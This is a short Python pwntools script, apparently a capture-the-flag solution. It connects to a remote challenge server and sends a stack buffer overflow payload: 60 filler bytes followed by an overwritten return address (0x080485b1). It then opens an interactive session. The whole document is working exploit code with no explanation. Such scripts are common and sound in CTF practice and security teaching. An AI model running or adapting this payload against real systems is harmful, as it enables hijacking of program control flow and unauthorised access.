from pwn import *

r = remote("thekidofarcrania.com", 4902)

payload = b"a"*60 + p64(0x080485b1)
r.sendline(payload)

r.interactive()